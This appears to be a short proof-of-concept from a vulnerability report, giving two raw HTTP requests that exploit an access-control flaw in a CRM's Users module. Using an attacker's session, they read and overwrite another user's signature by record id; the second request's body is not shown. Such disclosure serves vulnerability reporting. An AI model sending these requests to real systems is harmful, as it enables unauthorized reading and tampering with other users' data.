### 1) READ another user's signature by id
GET /index.php?module=Users&action=PopupSignature&record=d85a492e-d58c-495a-8bee-0b331ec0510c HTTP/1.1
Host: localhost:33116
Cookie: PHPSESSID=<attacker-session>


### 2) OVERWRITE another user's signature content by id
POST /index.php?module=Users&action=SaveSignature HTTP/1.1
Host: localhost:33116
Cookie: PHPSESSID=<attacker-session>
Content-Type: application/x-www-form-urlencoded

